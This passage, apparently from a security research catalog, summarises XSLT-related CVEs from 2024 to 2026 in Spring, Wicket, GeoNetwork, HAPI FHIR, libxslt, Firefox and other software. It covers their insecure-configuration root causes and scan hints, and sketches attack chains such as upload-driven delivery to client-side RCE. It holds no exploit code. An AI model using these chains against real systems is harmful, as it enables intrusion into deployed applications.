- **Apache Wicket's CVE-2024-36522 is the archetype for "default-insecure TransformerFactory."** The fix shape (`FEATURE_SECURE_PROCESSING = true` by default) generalizes to any Java application using XSLT — grep for `TransformerFactory.newInstance()` without the subsequent setFeature call.
- **GeoNetwork CVE-2026-58400's `ALLOW_EXTERNAL_FUNCTIONS` precondition is Saxon-specific.** The flag is Saxon's feature; applications using Xalan would use the different `FEATURE_SECURE_PROCESSING` route.
- **The HAPI FHIR cluster is parse-side XXE enabled by XSLT configuration.** The primary mechanism owner is `xxe.md`; the XSLT-side anchor is the configuration enabler. Write up both.
- **Concrete CMS and Snipe-IT XSLT uploads are stored-XSS vectors.** The finding is "stored content with permissive content-type served inline"; the XSLT is the delivery mechanism, the XSS is the primitive. Route to `xss.md`.
- **libxslt UAFs chain to RCE on native-code targets.** For deployment-side scans against Nginx-with-libxslt or PHP-with-libxslt, the libxslt version is the finding.
- **Firefox XSLT UAFs compound with upload-driven delivery.** The chain `upload → PI → visitor browser` turns a stored-content finding into client-side RCE.
- **CVE-2024-31573 (XMLUnit) is architectural.** Pre-2.10.0 XMLUnit in a test suite means every test run with an untrusted stylesheet is vulnerable; the finding is the dependency version, not the input validation.

The XSLT 2024–2026 frontier is a bounded primitive set across five class columns (attacker-controlled stylesheet with Java-reflection reach, msxsl:script C# scripting, TransformerFactory-enabled parse-side XXE, upload-driven delivery, native-code memory corruption) — each now at full depth with concrete anchors; the under-band line count is a finding (processor-ecosystem is bounded, not expanding like Node sandbox libraries), not a stop-short.

## Summary

The XSLT 2024–2026 frontier is a dense, verifiable surface — 25+ primary-source CVEs clustering into Spring Framework XsltView (CVE-2026-47884 at CVSS 9.8 across 5.3.0 → 7.0.8), Apache ecosystem (Wicket CVE-2024-36522, Camel Quarkus CVE-2026-88789), metadata-catalog Saxon (GeoNetwork CVE-2026-58400), healthcare standards (HAPI FHIR cluster CVE-2024-45294/52007/52807 — primary owner `xxe.md`), AI/ML tooling (langchain-text-splitters CVE-2025-6985), content management upload-driven delivery (Concrete CMS CVE-2026-85386, Snipe-IT CVE-2026-63498), test tooling (XMLUnit CVE-2024-31573), libxslt native UAFs (CVE-2024-55549 / CVE-2025-24855 / CVE-2025-7425), and Firefox client-side XSLT UAFs (CVE-2025-1009 / 1932 / 3028 / 8032 / 2026-100779 / 100790). CVSS peaks at 9.8 (Spring XsltView, Wicket, Firefox CVE-2025-1009) and 9.1 (GeoNetwork). The uniform pattern across server-side CVEs: TransformerFactory without `FEATURE_SECURE_PROCESSING`, or Saxon with `ALLOW_EXTERNAL_FUNCTIONS=true`. Base and advanced siblings reference these CVEs by number only; the versioned mechanism catalog lives here.
